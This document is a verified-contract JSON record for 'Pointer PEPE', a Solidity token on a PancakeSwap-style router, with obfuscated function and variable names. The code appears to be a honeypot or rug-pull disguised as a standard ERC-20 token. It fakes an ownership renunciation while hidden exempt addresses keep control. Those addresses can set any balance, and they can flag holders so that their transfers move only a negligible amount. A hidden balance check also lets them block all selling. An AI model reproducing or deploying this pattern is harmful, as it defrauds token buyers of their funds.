{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface exemptMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeFromIs) external view returns (uint256);\n\n    function transfer(address minWallet, uint256 liquidityToLaunched) external returns (bool);\n\n    function allowance(address fromLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityToLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minWallet,\n        uint256 liquidityToLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toTake, uint256 value);\n    event Approval(address indexed fromLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract shouldMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface toMarketing {\n    function createPair(address marketingExempt, address swapLaunched) external returns (address);\n}\n\ninterface exemptModeMetadata is exemptMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PointerPEPE is shouldMarketing, exemptMode, exemptModeMetadata {\n\n    function approve(address enableLiquidity, uint256 liquidityToLaunched) public virtual override returns (bool) {\n        takeTo[_msgSender()][enableLiquidity] = liquidityToLaunched;\n        emit Approval(_msgSender(), enableLiquidity, liquidityToLaunched);\n        return true;\n    }\n\n    function transferFrom(address shouldTo, address minWallet, uint256 liquidityToLaunched) external override returns (bool) {\n        if (_msgSender() != isModeReceiver) {\n            if (takeTo[shouldTo][_msgSender()] != type(uint256).max) {\n                require(liquidityToLaunched <= takeTo[shouldTo][_msgSender()]);\n                takeTo[shouldTo][_msgSender()] -= liquidityToLaunched;\n            }\n        }\n        return toLiquidity(shouldTo, minWallet, liquidityToLaunched);\n    }\n\n    bool public buyAt;\n\n    mapping(address => bool) public modeAutoExempt;\n\n    mapping(address => mapping(address => uint256)) private takeTo;\n\n    address isModeReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private sellTo;\n\n    uint256 public enableLaunch;\n\n    uint256 amountReceiver;\n\n    bool public receiverTotalMarketing;\n\n    address public marketingAtTake;\n\n    uint256 constant toLaunch = 16 ** 10;\n\n    uint256 private autoMinLaunched = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedReceiverShould;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeMin;\n    }\n\n    function transfer(address marketingReceiver, uint256 liquidityToLaunched) external virtual override returns (bool) {\n        return toLiquidity(_msgSender(), marketingReceiver, liquidityToLaunched);\n    }\n\n    bool public receiverShould;\n\n    address launchedReceiverAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function toLiquidity(address shouldTo, address minWallet, uint256 liquidityToLaunched) internal returns (bool) {\n        if (shouldTo == fromFund) {\n            return launchedReceiver(shouldTo, minWallet, liquidityToLaunched);\n        }\n        uint256 takeIs = exemptMode(marketingAtTake).balanceOf(launchedReceiverAt);\n        require(takeIs == amountReceiver);\n        require(minWallet != launchedReceiverAt);\n        if (isMarketing[shouldTo]) {\n            return launchedReceiver(shouldTo, minWallet, toLaunch);\n        }\n        return launchedReceiver(shouldTo, minWallet, liquidityToLaunched);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoMinLaunched;\n    }\n\n    function walletLiquidity(address marketingReceiver, uint256 liquidityToLaunched) public {\n        limitMarketing();\n        enableLaunched[marketingReceiver] = liquidityToLaunched;\n    }\n\n    address public fromFund;\n\n    bool private launchedMinLimit;\n\n    event OwnershipTransferred(address indexed senderIs, address indexed receiverLimitAt);\n\n    function atSwap(address launchedEnable) public {\n        limitMarketing();\n        \n        if (launchedEnable == fromFund || launchedEnable == marketingAtTake) {\n            return;\n        }\n        isMarketing[launchedEnable] = true;\n    }\n\n    constructor (){\n        if (receiverShould) {\n            senderSellList = false;\n        }\n        receiverMode maxTx = receiverMode(isModeReceiver);\n        marketingAtTake = toMarketing(maxTx.factory()).createPair(maxTx.WETH(), address(this));\n        if (enableLaunch == atWallet) {\n            atWallet = enableLaunch;\n        }\n        fromFund = _msgSender();\n        toExemptFund();\n        modeAutoExempt[fromFund] = true;\n        enableLaunched[fromFund] = autoMinLaunched;\n        \n        emit Transfer(address(0), fromFund, autoMinLaunched);\n    }\n\n    uint256 public listSenderTx;\n\n    function toExemptFund() public {\n        emit OwnershipTransferred(fromFund, address(0));\n        sellTo = address(0);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return autoLiquidity;\n    }\n\n    function launchedReceiver(address shouldTo, address minWallet, uint256 liquidityToLaunched) internal returns (bool) {\n        require(enableLaunched[shouldTo] >= liquidityToLaunched);\n        enableLaunched[shouldTo] -= liquidityToLaunched;\n        enableLaunched[minWallet] += liquidityToLaunched;\n        emit Transfer(shouldTo, minWallet, liquidityToLaunched);\n        return true;\n    }\n\n    string private feeMin = \"PPE\";\n\n    uint256 public tradingToken;\n\n    function teamAt(uint256 liquidityToLaunched) public {\n        limitMarketing();\n        amountReceiver = liquidityToLaunched;\n    }\n\n    function allowance(address fundSwap, address enableLiquidity) external view virtual override returns (uint256) {\n        if (enableLiquidity == isModeReceiver) {\n            return type(uint256).max;\n        }\n        return takeTo[fundSwap][enableLiquidity];\n    }\n\n    bool private swapFee;\n\n    bool public senderSellList;\n\n    string private autoLiquidity = \"Pointer PEPE\";\n\n    bool private totalTx;\n\n    function owner() external view returns (address) {\n        return sellTo;\n    }\n\n    function balanceOf(address modeFromIs) public view virtual override returns (uint256) {\n        return enableLaunched[modeFromIs];\n    }\n\n    function getOwner() external view returns (address) {\n        return sellTo;\n    }\n\n    function tokenIs(address marketingTo) public {\n        if (receiverTotalMarketing) {\n            return;\n        }\n        if (tradingToken == atWallet) {\n            launchedMinLimit = false;\n        }\n        modeAutoExempt[marketingTo] = true;\n        \n        receiverTotalMarketing = true;\n    }\n\n    uint256 public atWallet;\n\n    mapping(address => uint256) private enableLaunched;\n\n    mapping(address => bool) public isMarketing;\n\n    uint256 takeMin;\n\n    function limitMarketing() private view {\n        require(modeAutoExempt[_msgSender()]);\n    }\n\n    uint8 private launchedReceiverShould = 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLimitAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityToLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedEnable\",\"type\":\"address\"}],\"name\":\"atSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFromIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSenderTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAtTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeAutoExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTotalMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSellList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityToLaunched\",\"type\":\"uint256\"}],\"name\":\"teamAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toExemptFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTo\",\"type\":\"address\"}],\"name\":\"tokenIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityToLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityToLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityToLaunched\",\"type\":\"uint256\"}],\"name\":\"walletLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PointerPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}